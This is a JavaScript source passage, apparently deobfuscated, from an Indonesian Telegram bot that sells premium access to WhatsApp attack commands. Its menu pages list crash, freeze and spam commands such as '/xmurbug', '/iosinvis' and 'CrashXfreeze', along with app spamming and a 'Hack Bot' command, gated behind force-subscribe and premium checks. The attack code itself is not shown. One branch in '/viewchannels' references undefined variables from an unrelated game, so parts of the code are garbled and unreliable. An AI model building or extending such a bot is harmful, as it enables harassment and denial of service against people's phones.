      const botInfo = await ctx.telegram.getMe(),
        memberInfo = await ctx.telegram.getChatMember(input, botInfo.id);
      if (!["administrator", "creator"].includes(memberInfo.status)) return ctx.reply("Bot belum jadi admin di " + input);
    } catch {
      return ctx.reply("Channel tidak ditemukan / bot belum admin");
    }
    if (forceSubSession.mode === 1) {
      const saveObj = {};
      saveObj.channels = [input];
      saveJsonFile(PATHS.forceSubFile, saveObj);
      forceSubSessions.delete(ctx.from.id);
      const richMessage = new RichHTMLBuilder()
        .photo(MEDIA.home, "FORCE SUB")
        .heading(2, "FORCE SUB AKTIF")
        .divider()
        .paragraph("Channel: <code>" + input + "</code>")
        .build();
      return ctx.sendRichMessage(richMessage);
    }
    if (forceSubSession.mode === 2 && forceSubSession.step === 1) {
      forceSubSession.channels.push(input);
      forceSubSession.step = 2;
      const richMessage = new RichHTMLBuilder()
        .photo(MEDIA.home, "FORCE SUB")
        .heading(2, "Masukkan channel kedua")
        .paragraph("<b>2:</b>")
        .build();
      return ctx.sendRichMessage(richMessage);
    }
    if (forceSubSession.mode === 2 && forceSubSession.step === 2) {
      forceSubSession.channels.push(input);
      const saveObj = {};
      saveObj.channels = forceSubSession.channels;
      saveJsonFile(PATHS.forceSubFile, saveObj);
      forceSubSessions.delete(ctx.from.id);
      const tableOpts = {};
      tableOpts.bordered = true;
      tableOpts.striped = true;
      tableOpts.hasHeader = true;
      const richMessage = new RichHTMLBuilder()
        .photo(MEDIA.home, "FORCE SUB")
        .heading(2, "FORCE SUB AKTIF")
        .divider()
        .table([
          ["NO", "CHANNEL"],
          ["1", "<code>" + forceSubSession.channels[0] + "</code>"],
          ["2", "<code>" + forceSubSession.channels[1] + "</code>"]
        ], tableOpts)
        .build();
      return ctx.sendRichMessage(richMessage);
    }
  }
  return next();
});
bot.command("delch", ownerOnly, async ctx => {
  const saveObj = {};
  saveObj.channels = [];
  saveJsonFile(PATHS.forceSubFile, saveObj);
  forceSubSessions.delete(ctx.from.id);
  customChannelSessions.delete(ctx.from.id);
  const richMessage = new RichHTMLBuilder()
    .photo(MEDIA.home, "FORCE SUB")
    .heading(2, "FORCE SUBSCRIBE DIMATIKAN")
    .divider()
    .paragraph("Semua channel force subscribe telah dihapus.")
    .build();
  return ctx.sendRichMessage(richMessage);
});
bot.command("viewchannels", ownerOnly, async ctx => {
  const helper = {};
  helper.markdown = "Markdown";
  helper.equals = function (a, b) {
    return a === b;
  };
  helper.equals2 = function (a, b) {
    return a === b;
  };
  helper.tag = "cBgvm";
  helper.forceSub = "FORCE SUB";
  helper.emptyTitle = "TIDAK ADA CHANNEL";
  helper.emptyDesc = "Belum ada channel yang di-set untuk force subscribe.";
  helper.channelCol = "CHANNEL";
  helper.listTitle = "DAFTAR CHANNEL FORCE SUBSCRIBE";
  const H = helper,
    forceSubData = loadJsonFile(PATHS.forceSubFile);
  if (!forceSubData.channels || H.equals(forceSubData.channels.length, 0)) {
    if (H.equals2(H.tag, H.tag)) {
      const richMessage = new RichHTMLBuilder()
        .photo(MEDIA.home, H.forceSub)
        .heading(2, H.emptyTitle)
        .divider()
        .paragraph(H.emptyDesc)
        .build();
      return ctx.sendRichMessage(richMessage);
    } else {
      delete f[C];
      const opts = {};
      opts.parse_mode = H.markdown;
      return d.reply("💀 *GAME OVER*\n\nAngkanya: " + J.angka, opts);
    }
  }
  const rows = [
    ["NO", H.channelCol]
  ];
  forceSubData.channels.forEach((channel, index) => rows.push([String(index + 1), "<code>" + channel + "</code>"]));
  const tableOpts = {};
  tableOpts.bordered = true;
  tableOpts.striped = true;
  tableOpts.hasHeader = true;
  const richMessage = new RichHTMLBuilder()
    .photo(MEDIA.home, H.forceSub)
    .heading(2, H.listTitle)
    .divider()
    .table(rows, tableOpts)
    .divider()
    .paragraph("Total: <b>" + forceSubData.channels.length + "</b> channel")
    .build();
  return ctx.sendRichMessage(richMessage);
});
const forceSubGuardedCommands = new Set(["/start", "/freespamdelay", "/sexpolix", "/iosinvis", "/xdelay", "/xlite", "/DelayBrutality", "/delayios", "/applex", "/combox", "/asghards", "/infinityfc"]);
bot.use(async (ctx, next) => {
  if (!ctx.from) return next();
  const forceSubData = loadJsonFile(PATHS.forceSubFile);
  if (!forceSubData.channels?.["length"]) return next();
  if (isOwner(ctx.from.id)) return next();
  const rawText = ctx.message?.["text"] || ctx.callbackQuery?.["data"] || "",
    command = rawText.split(" ")[0].split("@")[0].toLowerCase();
  if (!forceSubGuardedCommands.has(command)) return next();
  let allJoined = true,
    missingChannels = [];
  for (const channel of forceSubData.channels) {
    try {
      const memberInfo = await ctx.telegram.getChatMember(channel, ctx.from.id);
      if (!["member", "administrator", "creator"].includes(memberInfo.status)) {
        allJoined = false;
        missingChannels.push(channel);
      }
    } catch {
      allJoined = false;
      missingChannels.push(channel);
    }
  }
  if (allJoined) return next();
  const channelList = forceSubData.channels.map(channel => "- " + channel).join("\n"),
    missingList = missingChannels.map(channel => "- " + channel).join("\n"),
    verifyButton = {};
  verifyButton.text = "Sudah Join - Verifikasi";
  verifyButton.callback_data = "verify_fsub";
  verifyButton.style = "success";
  const cancelButton = {};
  cancelButton.text = "Batal";
  cancelButton.callback_data = "cancel_fsub";
  cancelButton.style = "danger";
  const keyboardLayout = [...forceSubData.channels.map(channel => [{
      text: "" + channel,
      url: "https://t.me/" + channel.replace("@", "")
    }]), [verifyButton],
    [cancelButton]
  ];
  const richMessage = new RichHTMLBuilder()
    .photo(MEDIA.home, "FORCE SUBSCRIBE")
    .heading(2, "AKSES TERKUNCI")
    .divider()
    .paragraph("Kamu harus join channel di bawah ini untuk menggunakan command ini:")
    .paragraph(channelList)
    .divider()
    .paragraph(missingChannels.length > 0 ? "Belum join: " + missingList : "")
    .paragraph("Setelah join, klik tombol verifikasi di bawah.")
    .build();
  const replyMarkup = {};
  replyMarkup.inline_keyboard = keyboardLayout;
  const opts = {};
  opts.reply_markup = replyMarkup;
  return ctx.sendRichMessage(richMessage, opts);
});
bot.action("verify_fsub", async ctx => {
  const forceSubData = loadJsonFile(PATHS.forceSubFile);
  if (!forceSubData.channels?.["length"]) {
    await ctx.answerCbQuery("Force Subscribe sudah dimatikan");
    const replyMarkup = {};
    replyMarkup.inline_keyboard = [];
    const opts = {};
    opts.reply_markup = replyMarkup;
    return ctx.editMessageText("Force Subscribe sudah tidak aktif", opts);
  }
  let allJoined = true,
    missingChannels = [];
  for (const channel of forceSubData.channels) {
    try {
      const memberInfo = await ctx.telegram.getChatMember(channel, ctx.from.id);
      !["member", "administrator", "creator"].includes(memberInfo.status) && (allJoined = false, missingChannels.push(channel));
    } catch {
      allJoined = false;
      missingChannels.push(channel);
    }
  }
  if (allJoined) {
    await ctx.answerCbQuery("Verifikasi berhasil! Silahkan gunakan command lagi");
    const replyMarkup = {};
    replyMarkup.inline_keyboard = [];
    const opts = {};
    opts.reply_markup = replyMarkup;
    return ctx.editMessageText("Verifikasi berhasil. Silakan gunakan command kembali.", opts);
  } else {
    const missingText = missingChannels.join(", "),
      alert = {};
    alert.show_alert = true;
    await ctx.answerCbQuery("Kamu belum join: " + missingText, alert);
    return;
  }
});
bot.action("cancel_fsub", async ctx => {
  const helper = {};
  helper.cancelled = "Dibatalkan";
  const H = helper;
  await ctx.answerCbQuery(H.cancelled);
  const replyMarkup = {};
  replyMarkup.inline_keyboard = [];
  const opts = {};
  opts.reply_markup = replyMarkup;
  return ctx.editMessageText("Verifikasi dibatalkan", opts);
});
bot.command("helpsub", ownerOnly, async ctx => {
  const helper = {};
  helper.title = "FORCE SUB HELP";
  helper.subtitle = "COMMAND FORCE SUBSCRIBE";
  helper.colCommand = "COMMAND";
  helper.colFunction = "FUNGSI";
  helper.cmdStart = "<code>/start</code>";
  helper.descStart = "Mulai bot";
  helper.cmdCustom = "<code>/customchannel</code>";
  helper.cmdSetch1 = "<code>/setch1</code>";
  helper.descSetch1 = "Setup 1 channel (legacy)";
  helper.cmdSetch2 = "<code>/setch2</code>";
  helper.descSetch2 = "Setup 2 channel (legacy)";
  helper.cmdDelch = "<code>/delch</code>";
  helper.descDelch = "Hapus semua force subscribe";
  helper.cmdView = "Lihat daftar channel";
  helper.cmdCekip = "<code>/cekip</code>";
  helper.descCekip = "Check IP status";
  helper.cmdListBlocked = "<code>/listblocked</code>";
  helper.descListBlocked = "List IP blocked";
  helper.cmdBlockIp = "<code>/blockip</code>";
  helper.descBlockIp = "Block IP";
  helper.cmdUnblockIp = "<code>/unblockip</code>";
  helper.descUnblockIp = "Unblock IP";
  helper.cmdHelpSub = "<code>/helpsub</code>";
  helper.descHelpSub = "Bantuan ini";
  const H = helper;
  const tableOpts = {};
  tableOpts.bordered = true;
  tableOpts.striped = true;
  tableOpts.hasHeader = true;
  const richMessage = new RichHTMLBuilder()
    .photo(MEDIA.home, H.title)
    .heading(2, H.subtitle)
    .divider()
    .table([
      [H.colCommand, H.colFunction],
      [H.cmdStart, H.descStart],
      [H.cmdCustom, "Setup force subscribe (1-10 channel)"],
      [H.cmdSetch1, H.descSetch1],
      [H.cmdSetch2, H.descSetch2],
      [H.cmdDelch, H.descDelch],
      ["<code>/viewchannels</code>", H.cmdView],
      [H.cmdCekip, H.descCekip],
      [H.cmdListBlocked, H.descListBlocked],
      [H.cmdBlockIp, H.descBlockIp],
      [H.cmdUnblockIp, H.descUnblockIp],
      [H.cmdHelpSub, H.descHelpSub]
    ], tableOpts)
    .build();
  return ctx.sendRichMessage(richMessage);
});
bot.command("maintenance", developerOnly, async ctx => {
  try {
    const rawArgs = ctx.message.text.replace(/^\/maintenance\s*/i, "").trim(),
      message = rawArgs || "Mohon tunggu, kami sedang melakukan maintenance.",
      currentState = getMaintenanceState();
    let startAt = Date.now(),
      setBy = String(ctx.from.id);
    if (currentState.active && currentState.setAt > 0) {
      startAt = currentState.setAt;
      setBy = currentState.setBy || setBy;
    }
    const newState = {};
    newState.active = true;
    newState.message = message;
    newState.setAt = startAt;
    newState.setBy = setBy;
    saveMaintenanceState(newState);
    const syncResult = await syncMaintenanceToGithub(newState),
      formattedStart = new Date(startAt).toLocaleString("id-ID", {
        timeZone: "Asia/Jakarta",
        day: "2-digit",
        month: "2-digit",
        year: "numeric",
        hour: "2-digit",
        minute: "2-digit",
        second: "2-digit"
      }),
      elapsed = formatDurationMs(Date.now() - startAt),
      tableOpts = {};
    tableOpts.bordered = true;
    tableOpts.striped = true;
    tableOpts.hasHeader = true;
    const richMessage = new RichHTMLBuilder()
      .heading(2, "✅ MAINTENANCE AKTIF")
      .divider()
      .table([
        ["INFO", "DETAIL"],
        ["Status", "🔴 ON"],
        ["Message", message],
        ["Sejak", formattedStart],
        ["Durasi", elapsed]
      ], tableOpts)
      .divider()
      .paragraph("Semua user sekarang terkunci.")
      .paragraph("Developer & pengaktif tetap bisa akses.")
      .divider()
      .paragraph("<i>Matikan dengan:</i> <code>/unmaintenance</code>")
      .build();
    await ctx.sendRichMessage(richMessage);
  } catch (err) {
    const opts = {};
    opts.parse_mode = "HTML";
    await ctx.reply("❌ Error: " + err.message, opts);
  }
});
bot.command("unmaintenance", developerOnly, async ctx => {
  try {
    const currentState = getMaintenanceState(),
      startAt = currentState.setAt || Date.now(),
      elapsed = formatDurationMs(Date.now() - startAt),
      formattedStart = new Date(startAt).toLocaleString("id-ID", {
        timeZone: "Asia/Jakarta",
        day: "2-digit",
        month: "2-digit",
        year: "numeric",
        hour: "2-digit",
        minute: "2-digit",
        second: "2-digit"
      }),
      formattedEnd = new Date().toLocaleString("id-ID", {
        timeZone: "Asia/Jakarta",
        day: "2-digit",
        month: "2-digit",
        year: "numeric",
        hour: "2-digit",
        minute: "2-digit",
        second: "2-digit"
      }),
      newState = {};
    newState.active = false;
    newState.message = "";
    newState.setAt = 0;
    newState.setBy = null;
    saveMaintenanceState(newState);
    const syncResult = await syncMaintenanceToGithub(newState),
      tableOpts = {};
    tableOpts.bordered = true;
    tableOpts.striped = true;
    tableOpts.hasHeader = true;
    const richMessage = new RichHTMLBuilder()
      .heading(2, "✅ MAINTENANCE DIMATIKAN")
      .divider()
      .table([
        ["INFO", "DETAIL"],
        ["Status", "🟢 OFF"],
        ["Sejak", formattedStart],
        ["Sampai", formattedEnd],
        ["Total Durasi", elapsed],
        ["GitHub Sync", syncResult ? "✅ Terkirim" : "⚠️ Lokal saja"]
      ], tableOpts)
      .divider()
      .paragraph("Bot bisa diakses kembali oleh semua user.")
      .build();
    await ctx.sendRichMessage(richMessage);
  } catch (err) {
    const opts = {};
    opts.parse_mode = "HTML";
    await ctx.reply("❌ Error: " + err.message, opts);
  }
});
bot.command("addadmin", ownerOnly, async ctx => {
  const args = ctx.message.text.split(" ").slice(1);
  if (args.length === 0) return ctx.reply("Format: /addadmin <user_id>");
  const userId = args[0].trim();
  if (!/^\d+$/.test(userId)) return ctx.reply("User ID harus angka");
  !botRuntime.adminList.includes(userId) && (botRuntime.adminList.push(userId), saveJsonFile(PATHS.adminFile, botRuntime.adminList));
  const richMessage = new RichHTMLBuilder()
    .photo(MEDIA.home, "ADD ADMIN")
    .heading(2, "ADMIN DITAMBAHKAN")
    .divider()
    .paragraph("User ID: <code>" + userId + "</code>")
    .build();
  return ctx.sendRichMessage(richMessage);
});
bot.command("deladmin", ownerOnly, async ctx => {
  const args = ctx.message.text.split(" ").slice(1);
  if (args.length === 0) return ctx.reply("Format: /deladmin <user_id>");
  const userId = args[0].trim();
  botRuntime.adminList = botRuntime.adminList.filter(id => id !== userId);
  saveJsonFile(PATHS.adminFile, botRuntime.adminList);
  const richMessage = new RichHTMLBuilder()
    .photo(MEDIA.home, "DEL ADMIN")
    .heading(2, "ADMIN DIHAPUS")
    .divider()
    .paragraph("User ID: <code>" + userId + "</code>")
    .build();
  return ctx.sendRichMessage(richMessage);
});
bot.command("listadmin", ownerOnly, async ctx => {
  const helper = {};
  helper.equals = function (a, b) {
    return a === b;
  };
  helper.title = "ADMIN LIST";
  helper.empty = "TIDAK ADA ADMIN";
  helper.colId = "USER ID";
  helper.header = "DAFTAR ADMIN";
  const H = helper;
  if (H.equals(botRuntime.adminList.length, 0)) return ctx.sendRichMessage(new RichHTMLBuilder().photo(MEDIA.home, H.title).heading(2, H.empty).build());
  const rows = [
    ["NO", H.colId]
  ];
  botRuntime.adminList.forEach((id, index) => rows.push([String(index + 1), "<code>" + id + "</code>"]));
  const tableOpts = {};
  tableOpts.bordered = true;
  tableOpts.striped = true;
  tableOpts.hasHeader = true;
  return ctx.sendRichMessage(new RichHTMLBuilder().photo(MEDIA.home, "ADMIN LIST").heading(2, H.header).divider().table(rows, tableOpts).build());
});
bot.command("addprem", ownerOnly, async ctx => {
  const args = ctx.message.text.split(" ").slice(1);
  if (args.length === 0) return ctx.reply("Format: /addprem <user_id>");
  const userId = args[0].trim();
  if (!/^\d+$/.test(userId)) return ctx.reply("User ID harus angka");
  !botRuntime.premiumUsers.includes(userId) && (botRuntime.premiumUsers.push(userId), saveJsonFile(PATHS.premiumFile, botRuntime.premiumUsers));
  const richMessage = new RichHTMLBuilder()
    .photo(MEDIA.home, "ADD PREMIUM")
    .heading(2, "PREMIUM DITAMBAHKAN")
    .divider()
    .paragraph("User ID: <code>" + userId + "</code>")
    .build();
  return ctx.sendRichMessage(richMessage);
});
bot.command("delprem", ownerOnly, async ctx => {
  const args = ctx.message.text.split(" ").slice(1);
  if (args.length === 0) return ctx.reply("Format: /delprem <user_id>");
  const userId = args[0].trim();
  botRuntime.premiumUsers = botRuntime.premiumUsers.filter(id => id !== userId);
  saveJsonFile(PATHS.premiumFile, botRuntime.premiumUsers);
  const richMessage = new RichHTMLBuilder()
    .photo(MEDIA.home, "DEL PREMIUM")
    .heading(2, "PREMIUM DIHAPUS")
    .divider()
    .paragraph("User ID: <code>" + userId + "</code>")
    .build();
  return ctx.sendRichMessage(richMessage);
});
bot.command("listprem", ownerOnly, async ctx => {
  const helper = {};
  helper.title = "PREMIUM LIST";
  helper.empty = "TIDAK ADA PREMIUM";
  helper.colId = "USER ID";
  helper.header = "DAFTAR PREMIUM";
  const H = helper;
  if (botRuntime.premiumUsers.length === 0) return ctx.sendRichMessage(new RichHTMLBuilder().photo(MEDIA.home, H.title).heading(2, H.empty).build());
  const rows = [
    ["NO", H.colId]
  ];
  botRuntime.premiumUsers.forEach((id, index) => rows.push([String(index + 1), "<code>" + id + "</code>"]));
  const tableOpts = {};
  tableOpts.bordered = true;
  tableOpts.striped = true;
  tableOpts.hasHeader = true;
  return ctx.sendRichMessage(new RichHTMLBuilder().photo(MEDIA.home, H.title).heading(2, H.header).divider().table(rows, tableOpts).build());
});
bot.command("addpremgroup", ownerOnly, async ctx => {
  const args = ctx.message.text.split(" ").slice(1);
  if (args.length === 0) return ctx.reply("Format: /addpremgroup <group_id>");
  const groupId = args[0].trim();
  if (!/^-?\d+$/.test(groupId)) return ctx.reply("Group ID harus angka");
  const groups = loadPremiumGroups();
  if (!groups.includes(groupId)) {
    groups.push(groupId);
    savePremiumGroups(groups);
  }
  const richMessage = new RichHTMLBuilder()
    .photo(MEDIA.home, "ADD PREM GROUP")
    .heading(2, "GROUP PREMIUM DITAMBAHKAN")
    .divider()
    .paragraph("Group ID: <code>" + groupId + "</code>")
    .build();
  return ctx.sendRichMessage(richMessage);
});
bot.command("delpremgroup", ownerOnly, async ctx => {
  const args = ctx.message.text.split(" ").slice(1);
  if (args.length === 0) return ctx.reply("Format: /delpremgroup <group_id>");
  const groupId = args[0].trim();
  const groups = loadPremiumGroups().filter(id => id !== groupId);
  savePremiumGroups(groups);
  const richMessage = new RichHTMLBuilder()
    .photo(MEDIA.home, "DEL PREM GROUP")
    .heading(2, "GROUP PREMIUM DIHAPUS")
    .divider()
    .paragraph("Group ID: <code>" + groupId + "</code>")
    .build();
  return ctx.sendRichMessage(richMessage);
});
bot.command("listgroup", async ctx => {
  const groups = loadPremiumGroups();
  if (groups.length === 0) return ctx.sendRichMessage(new RichHTMLBuilder().photo(MEDIA.home, "PREMIUM GROUP").heading(2, "TIDAK ADA GROUP PREMIUM").build());
  const rows = [
    ["NO", "GROUP ID"]
  ];
  groups.forEach((id, index) => rows.push([String(index + 1), "<code>" + id + "</code>"]));
  const tableOpts = {};
  tableOpts.bordered = true;
  tableOpts.striped = true;
  tableOpts.hasHeader = true;
  return ctx.sendRichMessage(new RichHTMLBuilder().photo(MEDIA.home, "PREMIUM GROUP").heading(2, "DAFTAR GROUP PREMIUM").divider().table(rows, tableOpts).build());
});
bot.command("autopremgroup", ownerOnly, async ctx => {
  if (ctx.chat.type === "private") return ctx.reply("Command ini hanya di group");
  const groupId = ctx.chat.id.toString(),
    groups = loadPremiumGroups();
  if (groups.includes(groupId)) return ctx.reply("Group ini sudah premium");
  groups.push(groupId);
  savePremiumGroups(groups);
  const richMessage = new RichHTMLBuilder()
    .photo(MEDIA.home, "PREMIUM GROUP")
    .heading(2, "GROUP INI JADI PREMIUM")
    .divider()
    .paragraph("Group ID: <code>" + groupId + "</code>")
    .build();
  return ctx.sendRichMessage(richMessage);
});
bot.command("setmode", ownerOnly, async ctx => {
  const helper = {};
  helper.equals = function (a, b) {
    return a === b;
  };
  helper.formatMsg = "Format: /setmode self | public";
  helper.self = "self";
  helper.toolsDir = "./Tools";
  helper.title = "SET MODE";
  helper.changed = "MODE DIUBAH";
  helper.closeBold = "</b>";
  const H = helper,
    args = ctx.message.text.split(" ").slice(1);
  if (H.equals(args.length, 0)) return ctx.reply(H.formatMsg);
  const mode = args[0].toLowerCase();
  if (![H.self, "public"].includes(mode)) return ctx.reply("Mode harus self atau public");
  const mkdirOpts = {};
  mkdirOpts.recursive = true;
  if (!fs.existsSync(H.toolsDir)) fs.mkdirSync(H.toolsDir, mkdirOpts);
  const modeObj = {};
  modeObj.mode = mode;
  fs.writeFileSync(PATHS.MODE_FILE, JSON.stringify(modeObj, null, 2));
  botRuntime.currentMode = mode;
  const richMessage = new RichHTMLBuilder()
    .photo(MEDIA.home, H.title)
    .heading(2, H.changed)
    .divider()
    .paragraph("Mode: <b>" + mode.toUpperCase() + H.closeBold)
    .build();
  return ctx.sendRichMessage(richMessage);
});
bot.command("setgroupmode", ownerOnly, async ctx => {
  const helper = {};
  helper.equals = function (a, b) {
    return a === b;
  };
  helper.formatMsg = "Format: /setgroupmode on | off";
  helper.off = "off";
  helper.invalidMsg = "Mode harus on atau off";
  helper.toolsDir = "./Tools";
  helper.title = "GROUP MODE DIUBAH";
  helper.concat = function (a, b) {
    return a + b;
  };
  helper.concat2 = function (a, b) {
    return a + b;
  };
  helper.modeLabel = "Mode: <b>";
  helper.closeBold = "</b>";
  const H = helper,
    args = ctx.message.text.split(" ").slice(1);
  if (H.equals(args.length, 0)) return ctx.reply(H.formatMsg);
  const mode = args[0].toLowerCase();
  if (!["on", H.off].includes(mode)) return ctx.reply(H.invalidMsg);
  const mkdirOpts = {};
  mkdirOpts.recursive = true;
  if (!fs.existsSync(H.toolsDir)) fs.mkdirSync(H.toolsDir, mkdirOpts);
  const groupObj = {};
  groupObj.group = mode;
  fs.writeFileSync(PATHS.GROUP_FILE, JSON.stringify(groupObj, null, 2));
  const richMessage = new RichHTMLBuilder()
    .photo(MEDIA.home, "SET GROUP MODE")
    .heading(2, H.title)
    .divider()
    .paragraph(H.concat(H.concat2(H.modeLabel, mode.toUpperCase()), H.closeBold))
    .build();
  return ctx.sendRichMessage(richMessage);
});
bot.command("cekwa", ownerOnly, async ctx => {
  const helper = {};
  helper.online = "Online";
  helper.offline = "Offline";
  helper.title = "CHECK WHATSAPP";
  helper.header = "STATUS WHATSAPP";
  helper.colParam = "PARAMETER";
  helper.colValue = "VALUE";
  helper.rowStatus = "Status";
  helper.rowSender = "Sender";
  const H = helper;
  const statusText = H.offline,
    senderText = "-",
    tableOpts = {};
  tableOpts.bordered = true;
  tableOpts.striped = true;
  tableOpts.hasHeader = true;
  const richMessage = new RichHTMLBuilder()
    .photo(MEDIA.home, H.title)
    .heading(2, H.header)
    .divider()
    .table([
      [H.colParam, H.colValue],
      [H.rowStatus, statusText],
      [H.rowSender, senderText]
    ], tableOpts)
    .build();
  return ctx.sendRichMessage(richMessage);
});
bot.command("dashboard", ownerOnly, async ctx => {
  const ramUsed = (process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2);
  const ramTotal = (os.totalmem() / 1024 / 1024 / 1024).toFixed(2),
    waStatus = "Offline";
  const tableOpts = {};
  tableOpts.bordered = true;
  tableOpts.striped = true;
  tableOpts.hasHeader = true;
  const richMessage = new RichHTMLBuilder()
    .photo(MEDIA.home, "DASHBOARD")
    .heading(2, "DASHBOARD SYSTEM")
    .divider()
    .table([
      ["PARAMETER", "VALUE"],
      ["Uptime", formatUptime(process.uptime())],
      ["RAM Used", ramUsed + " MB"],
      ["Total RAM", ramTotal + " GB"],
      ["Mode", getBotMode().toUpperCase()],
      ["Group Mode", getGroupMode().toUpperCase()],
      ["WhatsApp", waStatus],
      ["Sender", "-"],
      ["Total Admin", String(botRuntime.adminList.length)],
      ["Total Premium", String(botRuntime.premiumUsers.length)],
      ["Total Prem Group", String(loadPremiumGroups().length)]
    ], tableOpts)
    .build();
  return ctx.sendRichMessage(richMessage);
});
const menuButtonStyles = ["primary", "success", "danger"];

function pickMenuButtonStyle() {
  return menuButtonStyles[0];
}
setInterval(async () => {
  botRuntime.discoIndex++;
  if (0 >= menuButtonStyles.length) botRuntime.discoIndex = 0;
  const currentStyle = pickMenuButtonStyle();
  const pendingEdits = [];
  for (const [messageId, entry] of botRuntime.activeMenus.entries()) {
    try {
      const keyboard = entry.keyboardBuilder(currentStyle),
        replyMarkup = {};
      replyMarkup.inline_keyboard = keyboard;
      pendingEdits.push(entry.ctx.telegram.editMessageReplyMarkup(entry.ctx.chat.id, messageId, undefined, replyMarkup).catch(() => {}));
    } catch {}
  }
  await Promise.allSettled(pendingEdits);
}, 5000);

function buildCallbackButton(label, callbackData, style = "default") {
  const helper = {};
  helper.amp = "&amp;";
  const H = helper,
    escaped = String(callbackData).replace(/&/g, H.amp).replace(/"/g, "&quot;");
  return "<tg-button type=\"callback_data\" style=\"" + style + "\" data=\"" + escaped + "\" size=\"large\">" + label + "</tg-button>";
}

function buildUrlButton(label, url, style = "default") {
  const escaped = String(url).replace(/&/g, "&amp;").replace(/"/g, "&quot;");
  return "<tg-button type=\"url\" style=\"" + style + "\" url=\"" + escaped + "\" size=\"large\">" + label + "</tg-button>";
}

function buildButtonRow(buttons) {
  if (!Array.isArray(buttons)) return "";
  return "<tg-button-row>" + buttons.join("") + "</tg-button-row>";
}

function buildButtonGrid(rows) {
  if (!Array.isArray(rows)) return "";
  return rows.map(row => Array.isArray(row) ? buildButtonRow(row) : "").join("");
}

function buildMenuNavigation(page) {
  if (page === 0) {
    return buildButtonGrid([
      [buildCallbackButton("📃 Open Script", "page_1", "primary")]
    ]);
  }
  if (page === 1) return buildButtonGrid([
    [buildCallbackButton("Back", "page_0", "primary"), buildCallbackButton("Home", "page_0", "danger"), buildCallbackButton("Next", "page_2", "success")]
  ]);
  if (page === 2) return buildButtonGrid([
    [buildCallbackButton("Back", "page_1", "primary"), buildCallbackButton("Home", "page_0", "danger"), buildCallbackButton("Next", "page_3", "success")]
  ]);
  if (page === 3) {
    return buildButtonGrid([
      [buildCallbackButton("Back", "page_2", "primary"), buildCallbackButton("Home", "page_0", "danger")]
    ]);
  }
  return buildButtonGrid([
    [buildCallbackButton("Home", "page_0", "danger")]
  ]);
}

function buildMenuPage(page) {
  if (page === 0) {
    const task1 = {};
    task1.text = "Security File -- Privacy";
    task1.checked = true;
    const task2 = {};
    task2.text = "Auto Update Latest Version Script";
    task2.checked = true;
    return new RichHTMLBuilder()
      .photo(MEDIA.home, "Created By X.Bawzzhhh")
      .heading(1, "𝐓𝐇𝐄 𝐃𝐀𝐑𝐊")
      .divider()
      .paragraph("<blockquote>Selamat Datang dan Selamat Menggunakan</blockquote>")
      .divider()
      .heading(2, "INFORMATION")
      .paragraph("<blockquote>Developer : @durovyatem<br>Support By : @Maklocrits<br>Version : 59 Xevo<br>System : Latest Auto-Update</blockquote>")
      .divider()
      .taskList(task1, task2, {
        text: "Premium Feature",
        checked: true
      })
      .divider()
      .paragraph("<i>⌘ 𝘉𝘠 𝘛𝘏𝘌 𝘋𝘈𝘙𝘒 ⌘</i>")
      .divider()
      .paragraph(buildMenuNavigation(0))
      .build();
  }
  if (page === 1) {
    const task1 = {};
    task1.text = "Command Lock System";
    task1.checked = true;
    const task2 = {};
    task2.text = "Mode & Group Control";
    task2.checked = true;
    return new RichHTMLBuilder()
      .photo(MEDIA.home, "SETTING CONTROL")
      .heading(1, "𝐓𝐇𝐄 𝐃𝐀𝐑𝐊")
      .divider()
      .heading(2, "🛠️ SETTING CONTROL SCRIPT")
      .divider()
      .paragraph("<blockquote>/addbot — Add Sender<br>/killsesi — Kill Sender<br>/pullupdate — Auto Update Script<br>/cekwa — Cek Sender<br>/offcmd — Nonaktif Command<br>/oncmd — Aktifkan Command<br>/setch1 — Setting 1 Channel<br>/setch2 — Setting 2 Channel<br>/customchannel — Setting Channel Custom<br>/viewchannels — Check Daftar Channels<br>/delch — Hapus Semua Channel<br>/addadmin — Tambah Admin Akses<br>/deladmin — Delete Admin Akses<br>/addprem — Tambah Premium Akses<br>/delprem — Hapus Premium Akses<br>/offcmd — Nonaktif Command<br>/oncmd — Aktifkan Command<br>/lockallcmd — Kunci Semua Command<br>/unlockallcmd — Buka Semua Command<br>/setmode — Set Mode Bot<br>/setgroupmode — Set Group Mode<br>/dashboard — Dashboard System</blockquote>")
      .divider()
      .taskList({
        text: "Sender Management",
        checked: true
      }, {
        text: "Channel Force Subscribe",
        checked: true
      }, {
        text: "Admin & Premium Control",
        checked: true
      }, task1, task2)
      .divider()
      .paragraph("<blockquote>Xb -- Family GXION the Spesialiss</blockquote>")
      .divider()
      .paragraph(buildMenuNavigation(1))
      .build();
  }
  if (page === 2) {
    const task1 = {};
    task1.text = "Tools & Downloader";
    task1.checked = true;
    return new RichHTMLBuilder()
      .photo(MEDIA.home, "TOOLS SCRIPT")
      .heading(1, "𝐓𝐇𝐄 𝐃𝐀𝐑𝐊")
      .divider()
      .heading(2, "🛠️ TOOLS SCRIPT")
      .divider()
      .paragraph("<blockquote>/rasukbot — Rasuk / Hack Bot<br>/cekemoji — Check Premium Emoji ID<br>/spamngl — Spam NGL Apps<br>/brat — Brat Text Maker<br>/cekfunction — Check Your Function<br>/tiktokdl — Download TikTok Video<br>/snack — Download SnackVideo<br>/ssiphone — iPhone Theme Screenshot<br>/jadwalsholat — Check Prayer Schedule<br>/trivia — Kuis Pengetahuan Umum<br>/slot — Games Slot (Fake)<br>/dadu — Lempar Dadu<br>/suit — Suit Games<br>/typing — Tes Kecepatan Mengetik<br>/math — Matematika Challenge<br>/koin — Games Koin<br>/cuaca — Check Weather<br>/time — Check Time Indonesia</blockquote>")
      .divider()
      .taskList(task1, {
        text: "Games & Entertainment",
        checked: true
      }, {
        text: "Utility & Checker",
        checked: true
      }, {
        text: "Fun & Random",
        checked: true
      })
      .divider()
      .paragraph("<blockquote>Xb -- Family GXION the Spesialiss</blockquote>")
      .divider()
      .paragraph(buildMenuNavigation(2))
      .build();
  }
  if (page === 3) {
    return new RichHTMLBuilder()
      .photo(MEDIA.home, "🦠 ALL BUG COMMAND")
      .heading(1, "𝐓𝐇𝐄 𝐃𝐀𝐑𝐊")
      .divider()
      .heading(2, "Xpremium Murbug")
      .paragraph("<blockquote>/xmurbug ➠ Murbug Can Spam<br>/xbc ➠ Murbug Spam Delay Low<br>/xdly ➠ Delay Freeze Spam<br>/vixtery ➠ CrashXfreeze Murbug</blockquote>")
      .divider()
      .heading(2, "Invisible Kingsz")
